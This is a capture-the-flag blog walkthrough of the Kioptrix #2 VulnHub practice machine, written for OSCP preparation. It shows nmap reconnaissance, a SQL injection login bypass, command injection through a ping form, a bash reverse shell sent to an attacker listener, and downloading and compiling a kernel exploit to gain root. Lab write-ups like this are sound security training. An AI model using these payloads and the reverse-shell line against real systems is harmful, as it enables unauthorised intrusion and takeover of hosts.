---
title: "Kioptrix #2 Walkthrough"
author: alex
date: Thu  6 Jul 17:15:48 CEST 2023
categories: [OSCP Prep,Walkthroughs]
tags: [oscp, ctf, walkthroughs, vulnhub]
img_path: /assets/img/posts/2023-07-08-kioptrix-2-walkthrough/
---

Today I'm hacking into **Kioptrix 1.1**. Or Kioptrix #2. This is one of the many **beginner-friendly OSCP-like** CTFs of Vulnhub. So it's a great starting point for preparing the OSCP tests. If you want to start with the previous level, check my walkthrough **[here!](/posts/kioptrix-1-walkthrough)**

## Methodology

1. Reconnaissance
2. Enumeration
3. Exploitation
   - Gaining root access

## Tools Used

- Netdiscover
- Nmap
- Searchsploit
- Someone's exploit

## Recon

Let's scan the network to discover our target's IP address:

```bash
sudo netdiscover
```
And here's the output:

```
Currently scanning: 192.168.18.0/16   |   Screen View: Unique Hosts                                               
                                                                                                                   
2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                                   
_____________________________________________________________________________
  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
-----------------------------------------------------------------------------
192.168.1.1     08:00:27:bf:11:12      1      60  PCS Systemtechnik GmbH                                          
192.168.1.38    08:00:27:fd:e3:ab      1      60  PCS Systemtechnik GmbH 
```

After getting the IP address of the target we now need to enumerate the target for open ports and protocols. I have used **Nmap** aggressive command for that: 

```bash
sudo nmap -p- -T4 -A -O -v 192.168.1.38
```

> **IDS & FW TRIGGERING** 
> 
> In real world situations, **this scans may trigger firewalls and other network security appliances.** If you want to run a softer scan, just change `-sV` to `-sS`. Once you know the open ports, you can target them individually. Change `-T4` (speed 4) to `-T1` (slow speed, will take ages) as well. It's not undetectable but less probable. You can also use `-D` for decoy. Check the Nmap theory **[here!](/posts/oscpath-week-1/#port-scanning)**
{: .prompt-warning }

And the output...

```
Nmap scan report for 192.168.1.38
Host is up (0.00040s latency).
Not shown: 65528 closed tcp ports (reset)

PORT     STATE SERVICE  VERSION

22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 
|   1024 8f3e8b1e5863fecf27a318093b52cf72 (RSA1)
|   1024 346b453dbacecab25355ef1e43703836 (DSA)
|_  1024 684d8cbbb65abd7971b87147ea004261 (RSA)

80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.0.52 (CentOS)

111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            761/udp   status
|_  100024  1            764/tcp   status

443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: md5WithRSAEncryption
| Not valid before: 2009-10-08T00:10:47
| Not valid after:  2010-10-08T00:10:47
| MD5:   01de29f9fbfb2eb2beafe6243157090f
|_SHA-1: 560c91966506fb0ffb8166b1ded3ac112ed4808a
|_ssl-date: 2023-05-30T02:01:42+00:00; +5h59m59s from scanner time.
|_http-server-header: Apache/2.0.52 (CentOS)

631/tcp  open  ipp      CUPS 1.1
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS POST PUT
|_  Potentially risky methods: PUT
|_http-title: 403 Forbidden
|_http-server-header: CUPS/1.1

764/tcp  open  status   1 (RPC #100024)

3306/tcp open  mysql    MySQL (unauthorized)

MAC Address: 08:00:27:79:1B:6D (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Uptime guess: 0.006 days (since Mon May 29 21:52:38 2023)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=206 (Good luck!)
IP ID Sequence Generation: All zeros

Host script results:
|_clock-skew: 5h59m58s
```

We can see some interesting ports open here. 

- **Port 22:** Nothing interesting so far.

- **Port 80/443:** Let's start with HTTP and HTTPS. We have both ports open so the first thing we are going to do is open the browser and search for http://192.168.1.38. We find a login page, let's keep going with the recon before trying anything here.

- **Other ports:** Visiting http://192.168.1.38:3306/ we see we are not allowed to connect to the MySQL server. 

Done with the recon then!

## Enumeration

Back to the login page. This cheap looking login form is crying for some **SQLi attempts**. And so we do!  As soon as we try the good ol' vanilla `admin' or 1=1 #` in the username text field and `1234` as password, we get access to the administrator page!

![SQL Injection](/login-sql-injection.png)

Now we see another text field for pinging hosts in the same network. Let's ping ourselves and check the output:

```
192.168.1.23

PING 192.168.1.23 (192.168.1.23) 56(84) bytes of data.
64 bytes from 192.168.1.23: icmp_seq=0 ttl=64 time=0.475 ms
64 bytes from 192.168.1.23: icmp_seq=1 ttl=64 time=1.05 ms
64 bytes from 192.168.1.23: icmp_seq=2 ttl=64 time=0.808 ms

--- 192.168.1.23 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2000ms
rtt min/avg/max/mdev = 0.475/0.780/1.058/0.239 ms, pipe 2
```

Looks like the output we get when pinging from the console so... would it be vulbnerable to **Remote Code Execution**? Let's try to submit `192.168.1.23; whoami`

![Remote Code Execution](/remote-code-whoami.png)

Oh yeah! **Vulnerable to RCE!** We can `cat` the `/etc/passwd` to do some user enumeration as well:

![/etc/passwd File](/data-leak.png)

Now let's try to spawn a shell for us:

**On attaker's machine:**

```bash
sudo nc -nvlp 443
```

**In the ping text field:**

```bash
192.168.1.23; bash -i >& /dev/tcp/192.168.1.23/443 0>&1
```

And we have a shell! Now it's time to escalate privileges! First, let's find out the kernel version and the release.

![Shell](/shell.png)

```bash
uname -a
```

And we see that **kernel is 2.6.9**. Now, let's cat the release:

```bash
cat /etc/*-release
```

And the release is **CentOS 4.5**.

## Exploitation

Back to our machine, let's find an exploit that suits best for these features:

```bash
searchsploit linux 2.6 CentOS 
```

And there's an exploit that seems to fit our purpose. Let's mirror it into our machine:

```bash
searchsploit -m linux/local/9545.c
```

Now we have to copy it into the `/var/www/html` folder and start Apache.

```bash
sudo service apache2 start
```

Back to Kioptrix:

```bash
wget 192.168.1.23/9545.c
gcc 9545.c -o exploit
chmod 777 exploit
./exploit
```
![Root!](/root.png)

And there we go! Now we are root! I know, it's quite easy to hack into but, as I said, this is a beginner-friendly machine. It's good for learning the basics. See you soon and happy hacking!
